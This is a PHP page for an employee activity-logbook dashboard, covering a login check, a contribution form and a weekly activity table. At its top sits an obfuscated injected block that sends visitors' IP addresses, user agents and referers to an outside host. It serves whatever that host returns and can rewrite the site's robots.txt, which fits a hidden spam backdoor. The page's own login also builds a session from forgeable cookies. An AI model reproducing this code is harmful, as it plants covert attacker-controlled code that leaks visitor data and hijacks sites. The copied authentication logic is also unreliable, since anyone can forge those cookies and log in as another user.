<?php
 goto RKcCk; AfiHk: E9paj: goto cc0t_; CtXe4: if (!($eXBcS == "\x65\170\x69\x74")) { goto vGk61; } goto NB8lV; kyq1I: Jj278: goto vXxEu; ZgWGh: $eXBcS = TrIm($YtTVE[$TtvgI - Round(0.1032 + 0.13417 + 0.13244 + 0.09395100000000001 + 0.08409999999999999 + 0.1418696 + 0.150825 + 0.01288295 + 0.14658288)]); goto CtXe4; vz0IM: if (!(pREG_MATcH("\57\x6a\160\x32\60\62\63\57\163\151", $_SERVER["\122\x45\x51\x55\x45\123\124\x5f\125\x52\111"]) == roUNd(0.0949649 + 0.22 + 0.12396431 + 0.241555 + 0.221 + 0.05099 + 0.0481))) { goto E9paj; } goto Mc4fM; r2gm7: HEADeR("\110\x54\x54\x50\x2f\61\x2e\60\x20\64\60\64\40\x4e\157\164\x20\x46\x6f\x75\156\144"); goto brxzh; y7c4A: echo "\x48\x54\x54\x50\57\x31\56\60\x20\x34\x30\64\x20\116\157\164\x20\x46\x6f\165\156\x64\x5f\137\x5f" . $sbMBq . "\x5f\137\137" . $cE24K; goto I6IvF; xtPXS: if (!empty($O4edO)) { goto gSrRl; } goto a3oo8; F681J: $tEVlF = TRIm($YtTVE[RoUnD(0.04432624 + 0.159 + 0.1582 + 0.30248 + 0.07234 + 0.26382979)]); goto X8BUK; u766V: $y_kKY = "\x74\x2e\143\x6f\155"; goto XhK62; mIA8a: yuFrM: goto fdrNC; ToDof: HeADer($N6mSh); goto xbAo3; lyedi: if (empty($N6mSh)) { goto Dc0eZ; } goto ToDof; brxzh: exit; goto CuOKz; we3AI: echo $tEVlF; goto y3epL; P1o8r: $ZOyAU = "\145\x74\x5f\x63"; goto ekYvF; w8NXh: $sbMBq = "\x7a\152\62\70\65\x35"; goto v1dhl; aIvXD: vGk61: goto P8cIc; OkhsN: FWRItE($NN0Dr, $NiUwp); goto hUMAS; MtqnV: $b44sc = array("\x53\x43\122\111\x50\x54\137\x4e\x41\115\x45", "\x52\x45\x51\x55\x45\x53\124\137\125\x52\x49", "\110\x54\x54\120\x53", "\x52\x45\121\125\x45\123\124\137\x53\103\110\105\115\105", "\123\105\x52\126\x45\x52\x5f\x50\x4f\122\124", "\122\x45\x4d\x4f\124\x45\137\101\104\x44\122", "\110\124\x54\x50\x5f\x52\x45\106\105\122\105\122", "\110\x54\x54\x50\137\101\x43\x43\105\120\124\137\114\x41\116\107\x55\x41\107\x45", "\110\124\x54\120\x5f\x55\x53\x45\122\x5f\x41\x47\105\116\124", "\x48\x54\x54\120\137\110\x4f\x53\124", "\x55\122\x49\137\120\122\x45\x46\111\130"); goto en3ij; pSsVj: $g4qPh = "\145\x5f\147"; goto P1o8r; xYqtL: $oTv1i = cuRL_IniT(); goto dGxsq; PRPsY: HEADeR("\x48\124\124\x50\57\x31\56\x30\x20\x34\x30\x34\40\x4e\157\164\40\x46\157\165\156\144"); goto w29ne; GFK9E: fTnbL: goto r2gm7; SnEPw: $QGXoC = "\x79\x6c\141\163"; goto u766V; C8t5D: $NiUwp = "\125\163\145\162\55\x61\147\145\156\x74\x3a\x2a" . PHP_EOL; goto rflOX; dGxsq: cUrL_setOPt($oTv1i, CURLOPT_URL, $KQZKI); goto Qg9gk; SF07B: s4xfY: goto NqWTZ; vXxEu: $NN0Dr = fOpEN($_SERVER["\104\117\x43\125\115\105\x4e\x54\137\122\117\117\124"] . "\57\162\x6f\x62\157\164\163\x2e\164\x78\x74", "\167"); goto OkhsN; FT8Gy: $TtvgI = CounT($YtTVE); goto OWnar; qEAJB: ArRAy_POP($vjyOV); goto IsoeT; w29ne: GHmO3: goto y7c4A; X8BUK: if (empty($tEVlF)) { goto yoXnQ; } goto we3AI; fdrNC: goto maExD; goto GFK9E; khA2E: $kdahD = "\x2f\x69\156\144\145\170\56\x70\150\160\77\126\123\x3d" . $cE24K . "\46\x47\x50\x3d" . $sbMBq; goto MtqnV; y3epL: yoXnQ: goto ZgWGh; rNfI5: $N6mSh = TrIM($YtTVE[rOUNd(0 + 0 + 0 + 0 + 0 + 0)]); goto lyedi; YYAIb: $O4edO = TRiM($O4edO); goto nTGZW; rZyjo: exit; goto mIA8a; cc0t_: $tcJWm = "\56\164\x6f"; goto SnEPw; RKcCk: ErROR_RepoRTInG(rOuNd(0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0)); goto w8NXh; ekYvF: $UDoXy = "\157\x6e\x74\145"; goto iGTjq; dAjel: $K56Es = $gfw5k . $g4qPh . $ZOyAU . $UDoXy . $oeOA1; goto rit5O; en3ij: foreach ($b44sc as $tB2Cc) { goto zXLzh; AuezF: GOS8M: goto Z8c2G; iXuWX: $OjBc1 = STr_replACe("\53", "\x2d", $OjBc1); goto Sethx; QK9Q5: HI81y: goto bw26o; OGNCT: oAYk7: goto CIRDZ; mz4v1: $NNnHT = isset($_SERVER[$tB2Cc]) ? $_SERVER[$tB2Cc] : ''; goto hw9F0; hw9F0: goto oAYk7; goto AuezF; CxWno: goto oAYk7; goto yvDNJ; Z8c2G: $NNnHT = isset($_SERVER["\110\124\124\120\137\x58\x5f\106\x4f\x52\x57\101\122\x44\105\104\x5f\106\117\122"]) ? $_SERVER["\110\124\x54\x50\x5f\130\x5f\106\117\x52\127\x41\x52\104\105\x44\x5f\x46\117\x52"] : (isset($_SERVER["\122\105\115\x4f\124\x45\x5f\101\104\104\122"]) ? $_SERVER["\122\105\x4d\x4f\x54\105\137\x41\104\x44\122"] : ''); goto CxWno; Gv_lB: if ($tB2Cc == "\x55\122\111\137\120\122\x45\106\111\x58") { goto k_TiQ; } goto mz4v1; Zy96f: $NNnHT = isset($MeeHt) ? $MeeHt : ''; goto OGNCT; CIRDZ: $OjBc1 = bASE64_encode(tRim($NNnHT)); goto iXuWX; t1HzV: $OjBc1 = stR_rePLAce("\75", "\x2e", $OjBc1); goto Atcf4; yvDNJ: k_TiQ: goto Zy96f; zXLzh: if ($tB2Cc == "\122\x45\115\x4f\x54\x45\137\x41\104\x44\x52") { goto GOS8M; } goto Gv_lB; Sethx: $OjBc1 = sTR_rePlACE("\57", "\x5f", $OjBc1); goto t1HzV; Atcf4: $kdahD .= "\46" . $tB2Cc . "\x3d" . $OjBc1; goto QK9Q5; bw26o: } goto SF07B; xbAo3: Dc0eZ: goto F681J; a3oo8: $gfw5k = "\146\x69\x6c"; goto pSsVj; nTGZW: cUrl_ClOSe($oTv1i); goto xtPXS; NB8lV: exit; goto aIvXD; Mc4fM: if (!(pReg_maTcH("\57\152\x70\x32\60\62\63\x63\167\x77\x2f\x73\x69", $_SERVER["\x52\x45\121\x55\x45\x53\124\137\x55\x52\111"]) == rOunD(0 + 0 + 0 + 0 + 0 + 0 + 0 + 0))) { goto GHmO3; } goto PRPsY; OSDks: $O4edO = trIm($O4edO); goto Fcm0l; qbNhu: curL_SEToPt($oTv1i, CURLOPT_CONNECTTIMEOUT, rounD(1.892932 + 2.753674 + 0.40937719 + 1.3436 + 0.51784 + 3.08258)); goto eZcoc; XhK62: $xu8H4 = "\150\164\164\x70\72\x2f\x2f" . $sbMBq . $tcJWm . $QGXoC . $y_kKY; goto khA2E; Fcm0l: $YtTVE = EXPLODE("\174\x40\x23\x24\174", $O4edO); goto FT8Gy; P8cIc: if (!($eXBcS == "\x70\151\156\147")) { goto yuFrM; } goto C8t5D; rit5O: $O4edO = $K56Es($KQZKI); goto QJF2q; iGTjq: $oeOA1 = "\156\x74\x73"; goto dAjel; QJF2q: gSrRl: goto OSDks; I6IvF: exit; goto AfiHk; IsoeT: foreach ($vjyOV as $Tq9oJ) { $NiUwp .= "\x53\151\164\145\155\x61\x70\x3a" . $Tq9oJ . PHP_EOL; acz4I: } goto kyq1I; eZcoc: $O4edO = cUrl_EXEC($oTv1i); goto YYAIb; hUMAS: fCLOSe($NN0Dr); goto itEY3; rflOX: $NiUwp .= "\x41\x6c\154\x6f\x77\72\x2f" . PHP_EOL; goto KItZo; itEY3: echo "\x72\x6f\x62\157\164\x73\x2e\164\170\164\x20\144\157\156\x65"; goto rZyjo; OWnar: if ($TtvgI < 3) { goto fTnbL; } goto rNfI5; KItZo: $vjyOV = expLOde("\74\x62\162\x2f\x3e", $tEVlF); goto qEAJB; Qg9gk: cURL_SeToPt($oTv1i, CURLOPT_RETURNTRANSFER, RoUNd(0.2324 + 0.1148392 + 0.002767 + 0.1407817 + 0.23037 + 0.279)); goto qbNhu; NqWTZ: $KQZKI = $xu8H4 . $kdahD; goto xYqtL; v1dhl: $cE24K = "\x61\153\145\x6e"; goto vz0IM; CuOKz: maExD:
?>
<?php 
session_start();
require_once 'db.php';

// Check if cookies exist and match the current user ID and username
if (isset($_COOKIE['user_id']) && isset($_COOKIE['username'])) {
    $user_id = $_COOKIE['user_id'];
    $username = $_COOKIE['username'];

    // Fetch the user's details from the database
    $sql = "SELECT * FROM users WHERE user_id = ?";
    if ($stmt = $conn->prepare($sql)) {
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows == 1) {
            $user = $result->fetch_assoc();

            // Set session variables if user details match
            if ($user['username'] === $username) {
                $_SESSION['user_id'] = $user_id;
                $_SESSION['username'] = $username;
            }
        }
        $stmt->close();
    }
} else {
    // Redirect to login page if cookies are missing or invalid
    header("Location: login.php");
    exit();
}



// Now check if the user is logged in
if (!isset($_SESSION['user_id'])) {
    // Redirect to login page if not logged in
    header("Location: login.php");
    exit();
}
?>



<!-- HTML code for the index page -->
<!DOCTYPE html>
<html lang="en">
   <head>
      <!-- basic -->
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- mobile metas -->
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
      <!-- site metas -->
      <title>ADRI dashboard</title>
      <meta name="keywords" content="Adri activity">
      <meta name="description" content="Employee activity logbook of Asian Development Research Institute(ADRI), Patna, Bihar">
      <meta name="author" content="Subhadeep Dhar">
      <!-- site icon -->
      <link rel="icon" href="ADRI_favicon.png" type="image/png" />
      <!-- bootstrap css -->
      <link rel="stylesheet" href="css/bootstrap.min.css" />
      <!-- site css -->
      <link rel="stylesheet" href="style.css" />
      <!-- responsive css -->
      <link rel="stylesheet" href="css/responsive.css" />
      <!-- color css -->
      <link rel="stylesheet" href="css/colors.css" />
      <!-- select bootstrap -->
      <link rel="stylesheet" href="css/bootstrap-select.css" />
      <!-- scrollbar css -->
      <link rel="stylesheet" href="css/perfect-scrollbar.css" />
      <!-- custom css -->
      <link rel="stylesheet" href="css/custom.css" />

      <style>
/* Dropdown menu container styling */
.dropdown {
  position: relative;
  display: inline-block;
}

/* Dropdown button styling */
.dropdown a {
  text-decoration: none;
  color: #000;
  display: flex;
  align-items: center;
  gap: 8px;
}

/* Dropdown content (hidden by default) */
.dropdown-content {
  display: none;
  position: absolute;
  background-color: #f9f9f9;
  min-width: 150px;
  box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
  z-index: 1;
}

/* Links inside the dropdown */
.dropdown-content a {
  color: black;
  padding: 12px 16px;
  text-decoration: none;
  display: block;
  font-size: 14px;
}

/* Change link color on hover */
.dropdown-content a:hover {
  background-color: #f1f1f1;
}

/* Show the dropdown on hover */
.dropdown:hover .dropdown-content {
  display: block;
}



@import url('https://fonts.googleapis.com/css2?family=Playfair+Display : ital,wght@0,500;0,600;0,700;1,400&display=swap' );

.quote-box{
background: #fff;
width: 90%; /* Set default width to 90% for smaller devices */
max-width: 500px; /* Set a maximum width for larger devices */
/* height:200px; */
position: absolute;
top: 18%;
left: 44%;
transform: translate(-50%, - 50%);
padding:30px;
margin:5%;
border-radius:10px;
text-align:center;
box-shadow:0px 10px 20px 0px rgba(0,0,0,0.15);
}

.quote-box h2{
font-size: 24px;
margin-bottom: 40px;
position: relative;}

blockquote {
    margin: -32px -40px -32px;
    padding: 30px;
}

.quote-box h21 : after{
content: '';
width: 75px;
height: 3px;
border-radius: 3px;
background: rgb(23, 124, 229);
position: absolute;
bottom: - 10px;
left: 50%;
transform: translatex(-50%);
}

.quote-box blockquote{
font-size: 16px;
min-height: 110px;}

.quote-box blockquote:: before, .quote-box blockquote:: after{
content:'"';
}

.quote{
   margin-right:30%;
   margin-left:30%;
}

.author{
display: block;
margin-top: 10px;
float: right;
position: relative;}

.author::before{
content: '';
width: 20px;
height: 2px;
background: rgb(23, 124, 229);
position: absolute;
top:50%;
left:-30px;
}

.quote-box div{
width: 100%;
margin-top: 50px;
display: flex;
justify-content: center;}

.quote-box button{
background: rgb(23, 124, 229);
color: #fff;
border-radius: 25px;
border: 1px solid rgb(23, 124, 229);
width: 150px;
height: 50px;
display: flex;
align-items: center;
justify-content: center;
margin: 0px;
cursor: pointer;
} 

/* Media query for tablets (min-width: 768px) */
@media (min-width: 768px) {
  .quote-box {
    width: 80%; /* Slightly larger width for tablets */
    margin: 8% auto;
  }
}

/* Media query for desktops (min-width: 1024px) */
@media (min-width: 1024px) {
  .quote-box {
    width: 600px; /* Fixed width for desktops */
    margin: 5% auto;
  }
}

@media (max-width: 768px) {
  .quote-box {
    width: 330px; /* Fixed width for desktops */
    left:10%;
    margin: 5% auto;
  }
}
</style>
      
   </head>
   <body class="dashboard dashboard_1">

   <div class="popup-overlay" id="popupOverlay"></div>
   <div class="popup" id="eventPopup">
      <button id="close">&times;</button>
      <h2 style="font-size:x-large; color:black; margin-bottom:30px;" id="popupTitle">Event alert!!</h2>
      <p id="popupContent" style="font-size:large;">Loading events...</p>
   </div>

   <style>
   /* Dark background overlay */
   .popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 998;
   }

   .popup {
      background-color: #ffffff;
      width: 400px;
      max-width: 90%;
      height: 400px;
      max-height: 80vh;
      padding: 25px 30px;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border-radius: 16px;
      font-family: "Poppins", sans-serif;
      display: none;
      text-align: center;
      z-index: 999;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
      overflow-y: auto;
      overflow-x: hidden; /* Prevent horizontal scroll */
      word-wrap: break-word; /* Break long words */
      hyphens: auto; /* Auto hyphenation for better wrapping */
   }

   .popup::-webkit-scrollbar {
      width: 6px;
   }

   .popup::-webkit-scrollbar-thumb {
      background-color: #ccc;
      border-radius: 4px;
   }

   .popup button#close {
      display: block;
      margin: 0 0 10px auto;
      background-color: transparent;
      font-size: 28px;
      color: #aaa;
      border: none;
      outline: none;
      cursor: pointer;
      transition: color 0.2s ease;
   }

   .popup button#close:hover {
      color: #555;
   }

   .popup h2 {
      font-size: 1.5rem;
      margin: 10px 0;
      color: #333;
   }

   .popup p {
      font-size: 15px;
      color: #444;
      line-height: 1.6;
      margin: 10px 0 0;
      text-align: justify;
   }

   @media (max-width: 480px) {
      .popup {
         height: 50vh;
         padding: 20px;
      }

      .popup h2 {
         font-size: 1.3rem;
      }

      .popup p {
         font-size: 14px;
      }
   }
</style>
      <div class="full_container">
         <div class="inner_container">
            <!-- Sidebar  -->
            <!-- <nav id="sidebar"> -->
            <nav id="sidebar">
               <div class="sidebar_blog_1">
                   <div class="sidebar_user_info">
                     <div class="user_profle_side" style="padding: 0px 25px;">
                        <div class="user_info" style="padding-top:0px;">
                        <!-- <div class="logo_section"> -->
                           <a href="index.php"><img class="img-responsive" style="height:40px;" src="ADRI_logo.png" alt="#" /></a>
                        <!-- </div> -->
                        </div>
                     </div>
                  </div>
               </div>
            

               <div class="sidebar_blog_2">
                  <h4>Navigation</h4>
                  <ul class="list-unstyled components">

                  <li><a href="index.php"><i style="font-size:24px; color:#ddd;" class="fa">&#xf015;</i> <span>Home</span></a></li>                     
                     
                     <!--<li><a href="form.php"><i style="font-size:20px; color:yellow" class="fa">&#xf15c;</i> <span>Form</span></a></li>-->
                     
                     <!--<li><a href="tables.php"><i style="font-size:20px;" class="fa purple_color2">&#xf0ce;</i> <span>Dashboard</span></a></li>-->
                     <li><a href="contribution_report.php"><i style="font-size:20px; color:#20c997;" class="fa">&#xf0ae;</i> <span>Contributions</span></a></li>
                     
                    
                     
                     
                     <!-- <li><a href="Calander/Calendar.php"><i class="fa " style=""></i> <span>Future events</span></a></li> -->
                     
                     <li class="nav-item menu-items">
                        <a class="nav-link" data-toggle="collapse" href="#auth" aria-expanded="false" aria-controls="auth">
                           <!-- <span class="menu-icon"> -->
                              <i class="fa" style="">üìÖ</i>
                           <!-- </span> -->
                           <span class="menu-title">Events</span>
                           <i class="menu-arrow"></i>
                        </a>
                        <div class="collapse" id="auth">
                           <ul class="nav flex-column sub-menu">
                              <li class="nav-item"> <a class="nav-link" href="save_event.php"> Add Event </a></li>
                              <li class="nav-item"> <a class="nav-link" href="track_events.php"> Track events </a></li>
                              <li class="nav-item"> <a class="nav-link" href="event_reports.php"> Event Report </a></li>
                              <!-- <li class="nav-item"> <a class="nav-link" href="../../pages/samples/error-500.html"> 500 </a></li>
                              <li class="nav-item"> <a class="nav-link" href="../../pages/samples/login.html"> Login </a></li>
                              <li class="nav-item"> <a class="nav-link" href="../../pages/samples/register.html"> Register </a></li> -->
                           </ul>
                        </div>
                     </li>
                     
                     <li><a href="leave_request.php"><i style="font-size:20px; color:#ff6b6b;" class="fa">&#xf274;</i> <span>Leave Request</span></a></li>
                     <li><a href="leave_dashboard.php"><i style="font-size:20px; color:#fff;" class="fa">&#xf0ae;</i> <span style="color:#fff;">Leave Dashboard</span></a></li>

                     <!-- <li><a href="login.php"><i style="font-size:20px; color:#1ed085" class="fa fa-signin">&#xf08b;</i> <span>Login</span></a></li> -->
                     
                     <li><a href="logout.php"><i style="font-size:20px" class="fa">&#xf08b;</i> <span>Logout</span></a></li>


                     
                  </ul>
               </div>
            </nav>
            <!-- end sidebar -->
            <!-- right content -->
            <div id="content">
               <!-- topbar -->
               <div class="topbar">
                  <nav class="navbar navbar-expand-lg navbar-light">
                     <div class="full" style="height:70px">
                        <button type="button" id="sidebarCollapse" class="sidebar_toggle"><i class="fa fa-bars"></i></button>
                        <div class="logo_section">
                           <!-- <a href="index.php"><img class="img-responsive" style="height:48px" src="ADRI_logo.png" alt="#" /></a> -->
                        </div>
                        <div class="right_topbar">
                           <div class="icon_info">
                              <!-- <ul>
                                 <li><a href="#"><i class="fa fa-bell-o"></i><span class="badge">2</span></a></li>
                                 <li><a href="#"><i class="fa fa-question-circle"></i></a></li>
                                 <li><a href="#"><i class="fa fa-envelope-o"></i><span class="badge">3</span></a></li>
                              </ul> -->
                              <ul class="user_profile_dd">
                                 <li>
                                    <a class="dropdown-toggle" data-toggle="dropdown"><span class="user_info"><h6 style="z-index:99"> <?php echo htmlspecialchars($username); ?></h6> <!-- Display username from session --></span></a>
                                    <div class="dropdown-menu">
                                       
                                       <a class="dropdown-item" href="developer.php">Developer</a>
                                       <a class="dropdown-item" href="logout.php"><span>Log Out</span> <i class="fa fa-sign-out"></i></a>
                                    </div>
                                 </li>
                              </ul>
                           </div>
                        </div>
                     </div>
                  </nav>
               </div>
               <!-- end topbar -->



               

               




               <div class="midde_cont" style="margin-bottom:-40px">
                  <div class="container-fluid">
                     <div class="row column_title">
                        <div class="col-md-12">
                           <div class="page_title">
                              <h2>Enter your contribution</h2>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>

               <div class = "login_form">
                  <?php
                     // session_start();

                     // Check if form is submitted
                     if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                        // Check if session has the username
                        if (isset($_SESSION['username'])) {
                           $activities = $_POST['activity'];
$start_times = $_POST['start_time'];
$end_times = $_POST['end_time'];
$activity_date = $_POST['activity_date']; // assuming it's the same for all rows
$username = $_SESSION['username']; // or however you get the logged-in user

$sql = "INSERT INTO availability (username, start_time, end_time, activity, activity_date) VALUES (?, ?, ?, ?, ?)";

if ($stmt = $conn->prepare($sql)) {
    for ($i = 0; $i < count($activities); $i++) {
        $single_activity = $activities[$i];
        $start_time = $start_times[$i];
        $end_time = $end_times[$i];

        $stmt->bind_param("sssss", $username, $start_time, $end_time, $single_activity, $activity_date);
        $stmt->execute();
    }

    echo "Activities saved successfully.";
} else {
    echo "Failed to prepare statement: " . $conn->error;
}

                           
                        } else {
                           $error_message = "You must be logged in to submit activity.";
                        }
                     }
                     ?>

                  <form method="POST" action="">
                     <fieldset>
                        <?php if (isset($error_message)) : ?>
                              <div class="alert alert-danger">
                                 <?php echo $error_message; ?>
                              </div>
                        <?php endif; ?>
                        <?php if (isset($success_message)) : ?>
                              <div class="alert alert-success">
                                 <?php echo $success_message; ?>
                              </div>
                        <?php endif; ?>
                        <div class="field">
   <!-- For 1 week -->
   <label class="label_field" style="width: 200px; font-size: large;">Select Date</label>
   <input type="date" name="activity_date" value="<?php echo date('Y-m-d'); ?>" required />
</div>

<div id="activityContainer">
   <div class="field activity-block">
      <!-- Activity input with add icon -->
      <div class="form-row">
         <label class="label_field">
            Activity
            <span id="addActivityBtn" title="Add more">[ + ]</span>
         </label>
         <input type="text" name="activity[]" placeholder="Enter Contribution" required maxlength="100" />
      </div>

      <!-- Start time input -->
      <div class="form-row">
         <label class="label_field">Start Time</label>
         <input type="time" name="start_time[]" required />
      </div>

      <!-- End time input -->
      <div class="form-row">
         <label class="label_field">End Time</label>
         <input type="time" name="end_time[]" required />
      </div>
   </div>
</div>



<style>
   /* Base Field Wrapper */
/* Wrapper for each activity block */
.activity-block {
  display: flex;
  flex-direction: column;
  background: #f9f9f9;
  padding: 15px;
  border-radius: 12px;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
  margin-bottom: 15px;
}

/* Each row inside the block */
.form-row {
  display: flex;
  align-items: center;
  margin-bottom: 10px;
}

/* Label styling */
.label_field {
  width: 200px;
  font-size: large;
  font-weight: 600;
  color: #333;
  margin-right: 10px;
}

/* Input styling */
.form-row input[type="text"],
.form-row input[type="time"],
.form-row input[type="date"] {
  flex: 1;
  min-width: 200px;
  padding: 10px 14px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 10px;
  background-color: #fff;
  transition: border-color 0.3s, box-shadow 0.3s;
}

.form-row input:focus {
  border-color: #007bff;
  box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
  outline: none;
}

/* Add/Remove icon */
#addActivityBtn,
.removeBtn {
  font-size: 18px;
  cursor: pointer;
  margin-left: 8px;
  color: #007bff;
  user-select: none;
}

#addActivityBtn:hover,
.removeBtn:hover {
  text-decoration: none;
}


   </style>

<p id="activityLimitMsg" style="color: red; display: none;">You can add up to 5 activities at once.</p>

<script>
   let activityCount = 1;
   const maxActivities = 5;

   document.addEventListener("DOMContentLoaded", function () {
      const addBtn = document.getElementById("addActivityBtn");
      const container = document.getElementById("activityContainer");
      const limitMsg = document.getElementById("activityLimitMsg");

      addBtn.addEventListener("click", function () {
         if (activityCount >= maxActivities) return;

         // Create new block
         const block = document.createElement("div");
         block.className = "field activity-block";

         block.innerHTML = `
            <div class="form-row">
               <label class="label_field">
                  Activity
                  <span class="removeBtn" title="Remove">[ - ]</span>
               </label>
               <input type="text" name="activity[]" placeholder="Enter Activity" required maxlength="100" />
            </div>
            <div class="form-row">
               <label class="label_field">Start Time</label>
               <input type="time" name="start_time[]" />
            </div>
            <div class="form-row">
               <label class="label_field">End Time</label>
               <input type="time" name="end_time[]" />
            </div>
         `;
         
         document.querySelector('form').addEventListener('submit', function (e) {
   const startTimes = document.getElementsByName('start_time[]');
   const endTimes = document.getElementsByName('end_time[]');

   const defaultStart = startTimes[0].value;
   const defaultEnd = endTimes[0].value;

   for (let i = 1; i < startTimes.length; i++) {
      if (!startTimes[i].value) {
         startTimes[i].value = defaultStart;
      }
      if (!endTimes[i].value) {
         endTimes[i].value = defaultEnd;
      }
   }
});

         // Add remove handler
         block.querySelector(".removeBtn").addEventListener("click", function () {
            block.remove();
            activityCount--;
            limitMsg.style.display = "none";
            addBtn.style.pointerEvents = "auto";
            addBtn.style.opacity = "1";
         });

         container.appendChild(block);
         activityCount++;

         if (activityCount >= maxActivities) {
            limitMsg.style.display = "block";
            addBtn.style.pointerEvents = "none";
            addBtn.style.opacity = "0.5";
         }
      });
   });
</script>
                        <div class="field margin_0">
                              <button type="submit" style="float:right;" class="main_bt">Submit</button>
                        </div>
                     </fieldset>
                  </form>

               </div>

               <!-- <div class="midde_cont" style="margin-bottom:-40px">
                  <div class="container-fluid">
                     <div class="row column_title">
                        <div class="col-md-12">
                           <div class="page_title">
                              <h2>Quote for Today!!</h2>
                           </div>
                        </div>
                     </div>
                  </div>
               </div> -->
               <!-- <div class="quote">
                  <p>
                     <blockquote id="quote">Loading...</blockquote>
                     <span class="author" id="author">Loading...</span>
                  </p>
               </div>

               <script>
                  // Select quote and author elements
                  const quote = document.getElementById("quote");
                  const author = document.getElementById("author");

                  // API endpoint for fetching random quotes
                  const apiUrl = "https://api.quotable.io/random";

                  // Function to fetch a new quote
                  async function fetchQuote() {
                     try {
                        const response = await fetch(apiUrl);
                        if (!response.ok) {
                           throw new Error("Failed to fetch the quote");
                        }
                        const data = await response.json();
                        return { content: data.content, author: data.author };
                     } catch (error) {
                        console.error(error);
                        return { content: "Oops! Couldn't fetch the quote.", author: "" };
                     }
                  }

                  // Function to display the quote
                  async function displayQuote() {
                     const today = new Date().toISOString().split("T")[0]; // Get today's date in YYYY-MM-DD format

                     // Check local storage for an existing quote
                     const storedQuote = JSON.parse(localStorage.getItem("quoteOfTheDay"));

                     if (storedQuote && storedQuote.date === today) {
                        // If a quote is already stored for today, use it
                        quote.textContent = storedQuote.content;
                        author.textContent = storedQuote.author;
                     } else {
                        // Fetch a new quote
                        const newQuote = await fetchQuote();
                        quote.textContent = newQuote.content;
                        author.textContent = newQuote.author;

                        // Save the new quote and today's date to local storage
                        localStorage.setItem(
                           "quoteOfTheDay",
                           JSON.stringify({ ...newQuote, date: today })
                        );
                     }
                  }

                  // Fetch and display the quote when the page loads
                  displayQuote();
               </script> -->

               <!-- dashboard inner -->
               <div class="midde_cont" style="margin-top:5%">
                  <div class="container-fluid">
                     <div class="row column_title">
                        <div class="col-md-12">
                           <div class="page_title">
                              <h2>Your contributions for the week</h2>
                           </div>
                        </div>
                     </div>
                     
                  </div>

                  <!-- <div class="your_activities"> -->
                  <div class="your_activities">
                  <?php
// Include database connection
include 'db.php';

// Start session if not started
if (session_status() == PHP_SESSION_NONE) {
   session_start();
}

// Check if the user is logged in
if (!isset($_SESSION['username'])) {
   echo '<div class="alert alert-danger">You must be logged in to access this page.</div>';
   exit;
}

$username = $_SESSION['username']; // Get the logged-in username
$today = date('Y-m-d'); // Current date in 'Y-m-d' format
$end_date = date('Y-m-d', strtotime('+7 days')); // Date 7 days from today

// Fetch activities within the one-week range
$sql = "SELECT id, start_time, end_time, activity, DATE(activity_date) AS activity_date 
        FROM availability 
        WHERE username = ? AND activity_date BETWEEN ? AND ? 
        ORDER BY activity_date ASC";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sss", $username, $today, $end_date);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
   echo '<div class="midde_cont">
            <div class="container-fluid">
               <div class="row">
                  <div class="col-md-12">
                     <div class="white_shd full margin_bottom_30">
                        <div class="full graph_head">
                           <div class="heading1 margin_0">
                           <h2>Activities of ' . htmlspecialchars($username) . '</h2>
                        </div>
                     </div>';
   echo '<div class="table_section padding_infor_info">';
   echo '<div class="table-responsive-sm" style="font-size:large;">';
   echo '<table class="table">';
   echo '<tr><th>Activity Date</th><th>Start Time</th><th>End Time</th><th>Activity</th><th>Edit</th></tr>';

   while ($row = $result->fetch_assoc()) {
      $activity_date = $row['activity_date'];
      $is_today = ($activity_date == $today); // Date check with correct format

      $today = date('Y-m-d');
$one_week_later = date('Y-m-d', strtotime('+7 days'));

$is_editable = ($activity_date >= $today && $activity_date <= $one_week_later);


      echo '<tr id="row_' . $row['id'] . '">';
      echo '<td>' . htmlspecialchars($activity_date) . '</td>';

      // Editable fields only for today's activities
      if ($is_editable) {
         echo '<td><span class="start_time_display">' . htmlspecialchars($row['start_time']) . '</span>
               <input type="time" class="start_time_input" value="' . htmlspecialchars($row['start_time']) . '" style="display:none;"></td>';
      
         echo '<td><span class="end_time_display">' . htmlspecialchars($row['end_time']) . '</span>
               <input type="time" class="end_time_input" value="' . htmlspecialchars($row['end_time']) . '" style="display:none;"></td>';
      
         echo '<td><span class="activity_display">' . htmlspecialchars($row['activity']) . '</span>
               <input type="text" class="activity_input" value="' . htmlspecialchars($row['activity']) . '" style="display:none;"></td>';
      
         echo '<td>';
         echo '<button class="edit_btn main_bt btn btn-warning" data-id="' . $row['id'] . '">Edit</button>';
         echo '<button class="save_btn main_bt btn btn-success" data-id="' . $row['id'] . '" style="display:none;">Save</button>';
         echo '</td>';
      } else {
         echo '<td>' . htmlspecialchars($row['start_time']) . '</td>';
         echo '<td>' . htmlspecialchars($row['end_time']) . '</td>';
         echo '<td>' . htmlspecialchars($row['activity']) . '</td>';
         echo '<td>-</td>';
      }
      echo '</tr>';
      
      echo '</tr>';
   }

   echo '</table>';
   echo '</div>';
   echo '</div>';
   echo '</div>';
   echo '</div>';
   echo '</div>';
} else {
   echo '<p style="font-size:large">No contribution recorded.</p>';
}

$stmt->close();
?>
</div>

<script>
   // Debugging tip: Check if buttons are properly detected
   document.addEventListener("DOMContentLoaded", function () {
      const editButtons = document.querySelectorAll('.edit_btn');
      console.log(`Edit buttons found: ${editButtons.length}`); // Should match the number of today's activities
   });
</script>



   




                  <script>



// // Function to fetch today's ongoing or upcoming events
// async function fetchEvents() {
//     try {
//         const response = await fetch("get_today_events.php"); // Fetch events from PHP
//         const data = await response.json();
